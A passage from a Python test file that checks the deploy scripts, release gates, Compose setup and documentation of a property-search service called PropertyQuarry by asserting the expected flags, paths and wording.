        "compose start scheduler",
    ]
    assert "Could not stop every pre-migration PropertyQuarry schema writer" in completed.stderr


def test_propertyquarry_postcommit_failure_holds_candidate_writers_stopped(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="postcommit-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-completed",
        "candidate-api-started",
        "compose stop --timeout 30 api worker scheduler render",
    ]
    assert not any(event.startswith("compose start ") for event in events)
    assert "Do not restart the previous image" in completed.stderr


def test_propertyquarry_first_deploy_migration_failure_has_no_runtime_to_restore(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="precommit-failure",
        api_state="stopped",
        worker_state="stopped",
        scheduler_state="stopped",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-failed",
        "compose stop --timeout 30 migrate",
    ]
    assert "no prior API, worker, scheduler, or render containers to restore" in completed.stderr


def test_propertyquarry_deploy_wires_quiesce_around_governed_migration() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--require-server-derived-database-identity" in script
    assert "--require-signed-disposable-or-allowed-database-target" in script
    assert "--database-fence-policy" in script
    assert "propertyquarry_deploy_quiesce.sh" not in script


def test_propertyquarry_deploy_wrapper_supports_focused_provider_country_matrix() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--signed-request-fd" in script
    assert "PROPERTYQUARRY_DEPLOY_PROVIDER_COUNTRIES" not in script


def test_propertyquarry_deploy_catalog_probe_is_read_only() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--read-only" in script
    assert "--forbid-state-mutation" in script
    assert "--require-explicit-preflight-disposition" in script


def test_propertyquarry_deploy_wrapper_requires_presentation_e2e_for_tour_media_changes() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--candidate-root-fd" in script
    assert "--forbid-candidate-output-authority" in script


def test_propertyquarry_deploy_wrapper_resolves_live_smoke_identity_from_env_file() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "EA_RUNTIME_MODE" in script
    assert "PROPERTYQUARRY_DEPLOY_SIGNED_REQUEST" in script
    assert "EA_API_TOKEN" not in script


def test_propertyquarry_deploy_mobile_smoke_covers_customer_app_surfaces() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "/app/" not in script


def test_propertyquarry_deploy_wrapper_stays_property_only() -> None:
    script = _read("scripts/deploy_propertyquarry.sh").lower()

    for forbidden in (
        "ea-openvoice",
        "openvoice",
        "ea-responses-proxy",
        "ea-teable-relay",
        "/docker/chummercomplete",
        "chummer-playwright",
        "/mnt/onedrive",
        "/mnt/pcloud",
    ):
        assert forbidden not in script


def test_propertyquarry_compose_mounts_operator_tour_export_drop() -> None:
    compose = _read("docker-compose.property.yml")

    assert "PROPERTYQUARRY_TOUR_EXPORT_DROP_DIR: /data/incoming_property_tours" in compose
    assert "PROPERTYQUARRY_TOUR_EXPORT_INCOMING_DIR: /data/incoming_property_tours" in compose
    assert "./state/incoming_property_tours:/data/incoming_property_tours" in compose


def test_propertyquarry_runtime_images_use_image_baked_app_code_not_repo_bind_mounts() -> None:
    compose = _read("docker-compose.property.yml")

    assert "./config:/app/config:ro" in compose
    assert "./ea:/app" not in compose
    assert "./scripts:/app/scripts" not in compose
    assert ".:/app" not in compose


def test_propertyquarry_render_runtime_keeps_playwright_for_magicfit_render_lane() -> None:
    dockerfile = _read("ea/Dockerfile.property")

    assert "COPY scripts/render_magicfit_property_flythrough.py /app/scripts/render_magicfit_property_flythrough.py" in dockerfile
    assert "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" in dockerfile
    assert "python -m playwright install --with-deps chromium" in dockerfile
    assert "chown -R ea:ea /ms-playwright" in dockerfile


def test_property_tour_export_scripts_share_container_incoming_path() -> None:
    discovery = _read("scripts/discover_property_tour_exports.py")
    manifest = _read("scripts/materialize_property_tour_export_manifest.py")

    assert 'or "/data/incoming_property_tours"' in discovery
    assert 'Path("/data/incoming_property_tours")' in manifest
    assert '"state" / "incoming_property_tours"' in manifest
    assert "/data/property_tour_export_drop" not in discovery


def test_property_release_gate_runs_payfunnels_billing_contracts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "PayFunnels checkout, webhook, refund, mismatch, and billing-surface contracts" in release_gate
    assert "tests/test_product_api_contracts.py -k 'payfunnels'" in release_gate


def test_property_release_gate_runs_heyy_whatsapp_contracts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "Heyy WhatsApp adapter, opt-in, STOP/START, webhook, and receipt contracts" in release_gate
    assert "tests/test_property_heyy_adapter_contracts.py" in release_gate
    assert "tests/test_property_heyy_api_contracts.py" in release_gate


def test_property_release_gate_runs_id_austria_readiness_contract() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "ID Austria OIDC readiness receipt and Austrian-IP sign-in gating" in release_gate
    assert "scripts/verify_id_austria_provider.py" in release_gate


def test_property_release_gate_runs_offline_ranking_benchmark() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "offline ranking benchmark for hard filters, soft scoring, ordering, and scout thresholds" in release_gate
    assert "scripts/check_property_ranking_benchmark.py" in release_gate


def test_propertyquarry_release_and_deploy_fail_closed_on_release_bound_dr_evidence() -> None:
    release_gate = _read("scripts/property_release_gates.sh")
    deploy = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy)
    for required in (
        "PROPERTYQUARRY_DR_BACKUP_RECEIPT",
        "PROPERTYQUARRY_DR_RESTORE_RECEIPT",
        "PROPERTYQUARRY_RELEASE_COMMIT_SHA",
        "PROPERTYQUARRY_RELEASE_IMAGE_DIGEST",
        "PROPERTYQUARRY_DR_RELEASE_MAX_AGE_SECONDS",
        "scripts/propertyquarry_postgres_dr.py release-gate",
        "_completion/disaster_recovery/release-gate.json",
    ):
        assert required in release_gate
    assert "tests/test_propertyquarry_postgres_dr.py" in release_gate
    assert release_gate.index("scripts/propertyquarry_postgres_dr.py release-gate") < release_gate.index(
        "/bin/bash -p scripts/propertyquarry_live_release_gates.sh"
    )
    assert "--controller-owns-all-privileged-actions" in deploy
    assert "--database-fence-policy" in deploy
    assert "--require-server-derived-database-identity" in deploy
    assert "propertyquarry_postgres_dr.py" not in deploy
    assert "PROPERTYQUARRY_DR_BACKUP_RECEIPT" not in deploy

def test_property_release_gate_runs_cached_evidence_overlay_contracts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert (
        "authenticated eight-table Teable to atomic Postgres evidence-overlay receipt, cached "
        "unavailable/stale/verified states, and no inline source indexing"
    ) in release_gate
    assert "tests/test_property_evidence_overlays.py" in release_gate


def test_property_release_gate_wires_tour_import_manifest_into_gold_status() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "scripts/materialize_property_tour_export_manifest.py" in release_gate
    assert "tour_export_incoming_dir=" in release_gate
    assert "property_api_container=\"${PROPERTYQUARRY_API_CONTAINER_NAME:-propertyquarry-api}\"" in release_gate
    assert "docker exec \"${property_api_container}\" python /app/scripts/verify_property_tour_controls.py" in release_gate
    assert "--tour-root /data/public_property_tours" in release_gate
    assert "property-tour-controls-release-gate-live-container.json" in release_gate
    assert "docker cp \"${property_api_container}:/data/artifacts/property-tour-controls-release-gate-live-container.json\"" in release_gate
    assert "docker exec \"${property_api_container}\" python /app/scripts/discover_property_tour_exports.py" in release_gate
    assert "--drop-dir /data/incoming_property_tours" in release_gate
    assert "--public-tour-dir /data/public_property_tours" in release_gate
    assert "property-tour-export-discovery-release-gate-live-container.json" in release_gate
    assert "docker exec --user root \"${property_api_container}\" python /app/scripts/materialize_property_tour_export_manifest.py" in release_gate
    assert "--incoming-root /data/incoming_property_tours" in release_gate
    assert "property-tour-export-import-manifest-release-gate-live-container.json" in release_gate
    assert "property_render_container=\"${PROPERTYQUARRY_RENDER_CONTAINER_NAME:-propertyquarry-render-tools}\"" in release_gate
    assert "scripts/verify_property_tour_vendor_tooling.py" in release_gate
    assert '--runtime-container "${property_api_container}"' in release_gate
    assert 'runtime_reconstruction_container="${PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_CONTAINER:-${property_render_container}}"' in release_gate
    assert 'runtime_reconstruction_container="${PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_CONTAINER:-${property_api_container}}"' not in release_gate
    assert "--runtime-only" in release_gate
    assert "_completion/tours/property-tour-vendor-tooling-current.json" in release_gate
    assert "--drop-dir \"${tour_export_incoming_dir}\"" in release_gate
    assert "--public-tour-dir \"${EA_PUBLIC_TOUR_DIR:-${EA_ROOT}/state/public_property_tours}\"" in release_gate
    assert "--tour-root \"${EA_PUBLIC_TOUR_DIR:-${EA_ROOT}/state/public_property_tours}\"" in release_gate
    assert "--incoming-root \"${tour_export_incoming_dir}\"" in release_gate
    assert "_completion/property_tour_exports/release-gate-import-manifest.json" in release_gate
    assert "--import-manifest-receipt _completion/property_tour_exports/release-gate-import-manifest.json" in release_gate
    assert "--vendor-tooling-receipt _completion/tours/property-tour-vendor-tooling-current.json" in release_gate
    assert "_completion/provider_smoke/production-e2e-provider-matrix-current.json" in release_gate


def test_property_deploy_wrapper_uses_durable_api_artifact_path_for_import_manifest() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--canonical-compose-plan" in deploy_script
    assert "docker exec" not in deploy_script
    assert "docker cp" not in deploy_script


def test_property_deploy_wrapper_refreshes_release_hygiene_before_gold_status() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--forbid-candidate-output-authority" in deploy_script
    assert "check_property_release_hygiene.py" not in deploy_script
    assert "propertyquarry_gold_status.py" not in deploy_script


def test_property_deploy_wrapper_rebuilds_and_recreates_render_tools_runtime() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--canonical-compose-plan" in deploy_script
    assert '"${DC[@]}"' not in deploy_script


def test_property_release_gate_mentions_live_mobile_surface_smoke() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "required live mobile surface smoke" in release_gate
    assert "scripts/propertyquarry_live_mobile_surface_smoke.py" in release_gate
    assert "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_LIVE_SMOKE_BASE_URL" in release_gate


def test_property_gold_refresh_checks_omagic_adapter_in_api_runtime() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    assert "Vendor-tooling receipt from host with API runtime adapter proof" in refresh_script
    assert '--runtime-container "${API_CONTAINER}"' in refresh_script
    assert "--runtime-container ''" not in refresh_script
    assert "Vendor-tooling receipt from render container" not in refresh_script


def test_property_deploy_requires_existing_mobile_research_detail_without_seeding() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--signed-request-fd" in deploy_script
    assert "seed-research-detail-fixture" not in deploy_script


def test_property_deploy_refreshes_scene_video_receipts_before_gold_status() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--forbid-candidate-output-authority" in deploy_script
    assert "scene_video_readiness" not in deploy_script


def test_property_release_gate_wires_scene_video_refresh_packet_verifier_into_gold_status() -> None:
    release_gate = _read("scripts/property_release_gates.sh")
    live_release_gate = _read("scripts/propertyquarry_live_release_gates.sh")

    for required in (
        'scene_video_shared_env_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_FILE:-state/runtime/property_scene_video_shared.env}"',
        'scene_video_shared_env_runtime_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_RUNTIME_FILE:-/home/ea/property_scene_video_shared.env}"',
        "copy_scene_video_shared_env_to_container",
        "docker_exec_scene_video_python",
        "scripts/property_scene_video_shared_env.py",
        "scripts/verify_property_scene_video_readiness.py",
        "--output /data/artifacts/property-scene-video-readiness-release-gate-verifier-live-container.json",
        "--load-shared-env",
        "--output _completion/scene_video_readiness/release-gate-verifier.json",
        "scripts/property_scene_video_runtime_status.py",
        "--output /data/artifacts/property-scene-video-runtime-status-release-gate-live-container.json",
        "--output _completion/scene_video_readiness/runtime-status.json",
        "scripts/materialize_scene_video_provider_refresh_packet.py",
        "scripts/verify_scene_video_provider_refresh_packet.py",
        "scripts/propertyquarry_notify_scene_video_provider_refresh.py",
        "_completion/scene_video_readiness/runtime-status.json",
        "--scene-video-runtime-status-receipt _completion/scene_video_readiness/runtime-status.json",
        "_completion/scene_video_readiness/provider-refresh-packet.json",
        "_completion/scene_video_readiness/provider-refresh-packet-verifier.json",
        "_completion/scene_video_readiness/provider-refresh-telegram-report.json",
        "--scene-video-provider-refresh-packet _completion/scene_video_readiness/provider-refresh-packet.json",
        "--scene-video-provider-refresh-packet-verifier-receipt _completion/scene_video_readiness/provider-refresh-packet-verifier.json",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_PRINCIPAL_ID",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_BASE_URL",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_STATE",
        "PROPERTYQUARRY_NOTIFICATION_PREFER_CONTAINER_RUNTIME",
    ):
        assert required in release_gate

    assert release_gate.index('scene_video_refresh_notification_report="_completion/scene_video_readiness/provider-refresh-telegram-report.json"') < release_gate.index('PYTHONPATH=ea "${PYTHON_BIN}" scripts/propertyquarry_gold_status.py')
    assert "> /data/artifacts/property-scene-video-readiness-release-gate-verifier-live-container.json" not in release_gate
    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE" in live_release_gate
    assert "EA_API_TOKEN" in live_release_gate
    assert "--require-research-detail" in live_release_gate
    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_SEED_FIXTURE" not in live_release_gate
    assert "--seed-research-detail-fixture" not in live_release_gate
    assert "PROPERTYQUARRY_LIVE_MOBILE_TIMEOUT_MS" in _read("scripts/propertyquarry_live_mobile_surface_smoke.py")
    assert "_completion/smoke/property-live-mobile-release-gate.json" in release_gate
    assert "--live-mobile-receipt _completion/smoke/property-live-mobile-release-gate.json" in release_gate
    assert "scripts/propertyquarry_live_public_smoke.py" in live_release_gate
    assert "scripts/propertyquarry_live_authenticated_smoke.py" in live_release_gate
    assert '--expected-plan-label "${PROPERTYQUARRY_LIVE_SMOKE_PLAN_LABEL:-Free}"' in live_release_gate
    assert "_completion/smoke/property-live-public-release-gate.json" in release_gate
    assert "_completion/smoke/property-live-authenticated-release-gate.json" in release_gate
    assert "--public-smoke-receipt _completion/smoke/property-live-public-release-gate.json" in release_gate
    assert "--authenticated-smoke-receipt _completion/smoke/property-live-authenticated-release-gate.json" in release_gate
    assert "scripts/verify_property_tour_provider_ownership.py" in release_gate
    assert "_completion/property_tour_ownership/release-gate.json" in release_gate
    assert "--tour-provider-ownership-receipt _completion/property_tour_ownership/release-gate.json" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_ENABLED" in release_gate
    assert "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED" in release_gate
    assert "tests/test_property_live_mobile_surface_smoke.py" in release_gate
    assert "tests/test_property_live_http_security.py" in release_gate
    assert "tests/test_property_live_presentation_security.py" in release_gate
    assert "tests/test_property_live_release_provenance.py" in release_gate
    assert "tests/test_propertyquarry_live_telegram_delivery.py" in release_gate
    assert "tests/test_property_public_tour_provider_retirement.py" in release_gate


def test_property_gold_refresh_wires_scene_video_runtime_status_into_gold_status() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    for required in (
        'scene_video_shared_env_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_FILE:-state/runtime/property_scene_video_shared.env}"',
        'scene_video_shared_env_runtime_file="${PROPERTYQUARRY_SCENE_VIDEO_SHARED_ENV_RUNTIME_FILE:-/home/ea/property_scene_video_shared.env}"',
        "copy_scene_video_shared_env_to_container",
        "docker_exec_scene_video_python",
        "refresh_scene_video_receipts",
        "scripts/property_scene_video_shared_env.py",
        "scripts/property_scene_video_runtime_status.py",
        "property-scene-video-runtime-status-current.json",
        "_completion/scene_video_readiness/runtime-status.json",
        "--scene-video-runtime-status-receipt",
    ):
        assert required in refresh_script


def test_property_gold_refresh_can_send_scene_video_provider_refresh_notification() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    for required in (
        "scripts/propertyquarry_notify_scene_video_provider_refresh.py",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_PRINCIPAL_ID",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_BASE_URL",
        "PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_STATE",
        "PROPERTYQUARRY_NOTIFICATION_PREFER_CONTAINER_RUNTIME",
        "_completion/scene_video_readiness/provider-refresh-telegram-report.json",
        '--packet "${scene_video_refresh_packet}"',
        '--verifier "${scene_video_refresh_packet_verifier}"',
        '--runtime-status "${scene_video_runtime_status_receipt}"',
        'printf \'{"status":"skipped","reason":"PROPERTYQUARRY_SCENE_VIDEO_PROVIDER_REFRESH_NOTIFICATION_ENABLED_not_set"}\\n\' > "${scene_video_refresh_notification_report}"',
        "Scene-video provider refresh notification failed",
    ):
        assert required in refresh_script

    assert refresh_script.index('scene_video_refresh_notification_report="_completion/scene_video_readiness/provider-refresh-telegram-report.json"') < refresh_script.index('log_step "Gold-status receipt"')


def test_property_gold_refresh_catalog_probe_is_read_only() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")
    catalog_step = refresh_script.index('"Provider catalog smoke receipt"')
    matrix_step = refresh_script.index('"Provider E2E matrix receipt"')

    assert catalog_step < refresh_script.index("--no-execute-search-matrix", catalog_step) < matrix_step
    assert catalog_step < refresh_script.index("--no-cross-country-sanitization", catalog_step) < matrix_step
    assert matrix_step < refresh_script.index("--execute-search-matrix", matrix_step)


def test_property_release_gate_runs_generated_reconstruction_glb_smoke() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "scripts/ensure_propertyquarry_render_bridge_runtime.py" in release_gate
    assert "live generated-reconstruction GLB export smoke" in release_gate
    assert "service-owned generated-reconstruction smoke" in release_gate
    assert "scripts/property_runtime_reconstruction_smoke.py" in release_gate
    assert "scripts/property_service_generated_reconstruction_smoke.py" in release_gate
    assert "PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_CONTAINER" in release_gate
    assert "PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_SMOKE_SLUG" in release_gate
    assert "PROPERTYQUARRY_RUNTIME_RECONSTRUCTION_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_SERVICE_GENERATED_RECONSTRUCTION_SMOKE_SLUG" in release_gate
    assert "PROPERTYQUARRY_SERVICE_GENERATED_RECONSTRUCTION_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_LIVE_HOST_HEADER" in release_gate
    assert "--require-public-contract" in release_gate
    assert "scripts/property_service_generated_reconstruction_smoke.py" in release_gate
    assert '--host-header "${PROPERTYQUARRY_LIVE_HOST_HEADER:-propertyquarry.com}"' in release_gate
    assert "--require-browser-shell" in release_gate
    assert "--require-browser-shell" in release_gate
    assert '--host-header "${PROPERTYQUARRY_LIVE_HOST_HEADER:-propertyquarry.com}"' in release_gate
    assert "--require-glb" in release_gate
    assert "_completion/tours/property-render-bridge-runtime-release-gate.json" in release_gate
    assert "_completion/tours/property-runtime-reconstruction-release-gate.json" in release_gate
    assert "_completion/tours/property-service-generated-reconstruction-release-gate.json" in release_gate
    assert "--runtime-reconstruction-receipt _completion/tours/property-runtime-reconstruction-release-gate.json" in release_gate
    assert "--service-generated-reconstruction-receipt _completion/tours/property-service-generated-reconstruction-release-gate.json" in release_gate
    assert "--fail-on-error" in release_gate


def test_property_gold_refresh_runs_generated_reconstruction_browser_shell_smoke() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    assert "scripts/ensure_propertyquarry_render_bridge_runtime.py" in refresh_script
    assert "scripts/property_runtime_reconstruction_smoke.py" in refresh_script
    assert "scripts/property_service_generated_reconstruction_smoke.py" in refresh_script
    assert "--public-base-url \"${BASE_URL}\"" in refresh_script
    assert '--host-header "${HOST_HEADER}"' in refresh_script
    assert "--require-public-contract" in refresh_script
    assert "--require-browser-shell" in refresh_script
    assert "--require-browser-shell" in refresh_script
    assert "--require-glb" in refresh_script
    assert "_completion/tours/property-render-bridge-runtime-current.json" in refresh_script
    assert "_completion/tours/property-runtime-reconstruction-release-gate.json" in refresh_script
    assert "PROPERTYQUARRY_SERVICE_GENERATED_RECONSTRUCTION_SMOKE_SLUG" in refresh_script
    assert "_completion/tours/property-service-generated-reconstruction-current.json" in refresh_script
    assert "--service-generated-reconstruction-receipt" in refresh_script
    assert '--runtime-container "${API_CONTAINER}"' in refresh_script


def test_property_gold_refresh_runs_walkthrough_quality_on_host_toolchain() -> None:
    refresh_script = _read("scripts/refresh_propertyquarry_current_gold_receipts.sh")

    provider_index = refresh_script.index(
        "scripts/propertyquarry_walkthrough_provider_proof_gate.py"
    )
    quality_index = refresh_script.index(
        "scripts/propertyquarry_walkthrough_quality_gate.py"
    )
    stale_receipt_clear_index = refresh_script.index(
        'rm -f "${walkthrough_provider_proof_receipt}" "${walkthrough_quality_receipt}"'
    )
    assert stale_receipt_clear_index < provider_index
    assert provider_index < quality_index
    assert "PROPERTYQUARRY_WALKTHROUGH_PROVIDER_PROOF_TIMEOUT_SECONDS" in refresh_script
    assert "PROPERTYQUARRY_WALKTHROUGH_QUALITY_PROCESS_TIMEOUT_SECONDS" in refresh_script
    assert "PROPERTYQUARRY_WALKTHROUGH_QUALITY_FFPROBE_TIMEOUT_SECONDS" in refresh_script
    assert "PROPERTYQUARRY_WALKTHROUGH_QUALITY_FRAME_SAMPLE_TIMEOUT_SECONDS" in refresh_script
    assert refresh_script.count('--tour-root "${walkthrough_tour_root}"') == 2
    assert '--provider-proof-receipt "${walkthrough_provider_proof_receipt}"' in refresh_script
    assert '"--walkthrough-provider-proof-receipt" "${walkthrough_provider_proof_receipt}"' in refresh_script
    assert "python /app/scripts/propertyquarry_walkthrough_quality_gate.py" not in refresh_script


def test_property_release_gate_binds_quality_to_provider_proof_on_one_tour_root() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    provider_index = release_gate.index(
        "scripts/propertyquarry_walkthrough_provider_proof_gate.py"
    )
    quality_index = release_gate.index(
        "scripts/propertyquarry_walkthrough_quality_gate.py"
    )
    assert provider_index < quality_index
    assert release_gate.count('--tour-root "${walkthrough_provider_proof_tour_root}"') == 2
    assert (
        "--provider-proof-receipt _completion/smoke/"
        "property-live-walkthrough-provider-proof-release-gate.json"
    ) in release_gate


def test_property_release_gate_invokes_launch_gold_with_full_explicit_receipts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")
    gold_call = release_gate.split(
        'PYTHONPATH=ea "${PYTHON_BIN}" scripts/propertyquarry_gold_status.py \\\n',
        1,
    )[1].split("  --fail-on-blocked", 1)[0]

    for required_flag in (
        "--profile launch",
        "--performance-receipt",
        "--continuous-ux-receipt",
        "--live-mobile-receipt",
        "--accessibility-receipt",
        "--failure-state-receipt",
        "--activation-to-value-receipt",
        "--public-smoke-receipt",
        "--authenticated-smoke-receipt",
        "--billing-receipt",
        "--whole-project-scope-receipt",
        "--security-posture-receipt",
        "--release-hygiene-receipt",
        "--id-austria-receipt",
        "--provider-catalog-receipt",
        "--provider-matrix-receipt",
        "--slo-metrics-snapshot",
        "--slo-metrics-probe",
        "--monitoring-runtime-receipt",
        "--prometheus-range-receipt",
        "--prometheus-range-response",
        "--alert-delivery-receipt",
        "--require-launch-evidence",
        "--expected-release-sha",
        "--expected-image-digest",
        "--expected-teable-origin",
        "--expected-teable-base-id-sha256",
        "--expected-evidence-overlay-phase",
    ):
        assert required_flag in gold_call
    for required_env in (
        "PROPERTYQUARRY_CONTINUOUS_UX_RECEIPT",
        "PROPERTYQUARRY_FAILURE_STATE_RECEIPT",
        "PROPERTYQUARRY_ACTIVATION_TO_VALUE_RECEIPT",
        "PROPERTYQUARRY_PROVIDER_CATALOG_RECEIPT",
    ):
        assert required_env in release_gate
    assert (
        'expected_public_origin="${PROPERTYQUARRY_PUBLIC_ORIGIN:-'
        '${PROPERTYQUARRY_EXPECTED_RELEASE_PUBLIC_ORIGIN:-}}"'
    ) in release_gate
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_ORIGIN" in release_gate
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_BASE_ID_SHA256" in release_gate
    gold_index = release_gate.index("scripts/propertyquarry_gold_status.py")
    for receipt_writer in (
        "property-security-posture-release-gate.json",
        "property-release-hygiene-release-gate.json",
        "property-whole-project-scope-release-gate.json",
    ):
        assert release_gate.index(receipt_writer) < gold_index


def test_property_deploy_refreshes_service_generated_reconstruction_before_gold_status() -> None:
    deploy_script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy_script)
    assert "--forbid-candidate-output-authority" in deploy_script
    assert "property_service_generated_reconstruction_smoke.py" not in deploy_script


def test_property_release_gate_sends_gold_notification_when_green() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "scripts/propertyquarry_notify_gold_status.py" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_PRINCIPAL_ID" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_BASE_URL" in release_gate
    assert "PROPERTYQUARRY_GOLD_NOTIFICATION_STATE" in release_gate
    assert "PROPERTYQUARRY_NOTIFICATION_PREFER_CONTAINER_RUNTIME" in release_gate
    assert "_completion/property_gold_status/telegram-notify-report.json" in release_gate
    assert "warning: PropertyQuarry gold notification script failed." in release_gate


def test_readme_separates_disposable_compose_from_production_handoff() -> None:
    readme = " ".join(_read("README.md").split())

    assert "make deploy" not in readme
    assert "scripts/deploy_propertyquarry.sh" in readme
    assert "## Disposable local development" in readme
    assert (
        "EA_RUNTIME_MODE=dev docker compose -f docker-compose.property.yml up -d --build"
        in readme
    )
    assert "## Production release handoff" in readme
    assert "PROPERTYQUARRY_DEPLOY_SIGNED_REQUEST" in readme
    assert "propertyquarry-deploy-preflight-request.json" in readme
    assert "./scripts/deploy_propertyquarry.sh --preflight-only" in readme
    assert "A preflight request is operation-bound and non-authorizing" in readme
    assert "propertyquarry-deploy-run-request.json" in readme
    assert "independently installed release controller" in readme
    assert "The caller must remain unprivileged, have no Docker daemon authority" in readme
    assert "docs/PROPERTYQUARRY_RELEASE_CONTROL_PROTOCOL_V1.md" in readme
    assert (
        "propertyquarry_release_make_dispatch.py "
        "propertyquarry-release-protocol-contracts"
        in readme
    )
    assert "does not verify signatures, establish trust, authorize an operation" in readme
    assert "There is no local Compose fallback." in readme
    assert "POSTGRES_PASSWORD" in readme
    assert "EA_SIGNING_SECRET" in readme
    assert "EA_API_TOKEN or local access settings" in readme
    assert "PROPERTYQUARRY_RUNTIME_GATES=1" in readme
    assert "PROPERTYQUARRY_LIVE_SMOKE_BASE_URL=http://localhost:8097" in readme
    assert "EA_HOST_PORT=8097 make deploy" not in readme
    assert "PROPERTYQUARRY_COMPOSE_PROJECT_NAME=propertyquarry-next" not in readme
    assert "PROPERTYQUARRY_API_CONTAINER_NAME=propertyquarry-api-next" not in readme
    assert "PROPERTYQUARRY_DEPLOY_PROVIDER_E2E=1" not in readme


def test_schema_migration_docs_reserve_production_for_signed_controller() -> None:
    migration_docs = _read("docs/PROPERTYQUARRY_SCHEMA_MIGRATIONS.md")
    production = " ".join(
        migration_docs.split("## Production deploy phase\n", 1)[1]
        .split("## Disposable development and test targets\n", 1)[0]
        .split()
    )
    disposable = " ".join(
        migration_docs.split("## Disposable development and test targets\n", 1)[1]
        .split("## Runtime readiness\n", 1)[0]
        .split()
    )

    assert "candidate checkout has no production migration authority" in production
    assert "PROPERTYQUARRY_DEPLOY_SIGNED_REQUEST" in production
    assert "propertyquarry-deploy-preflight-request.json" in production
    assert "./scripts/deploy_propertyquarry.sh --preflight-only" in production
    assert "preflight request is operation-bound and cannot authorize mutation" in production
    assert "distinct, fresh `deploy-run` signed request" in production
    assert (
        "Direct Compose and Python migration commands are not a production fallback"
        in production
    )
    assert "docker compose" not in production
    assert "migrate_property_search_storage.py" not in production
    assert "disposable local development database" in disposable
    assert "EA_RUNTIME_MODE=dev" in disposable
    assert "docker compose -f docker-compose.property.yml up -d --build" in disposable
    assert "python3 scripts/migrate_property_search_storage.py" in disposable
    assert "run the candidate release's deploy migration" not in migration_docs


def test_schema_v11_docs_require_contained_homogeneous_cutover() -> None:
    migration_docs = _read("docs/PROPERTYQUARRY_SCHEMA_MIGRATIONS.md")
    cutover = " ".join(
        migration_docs.split(
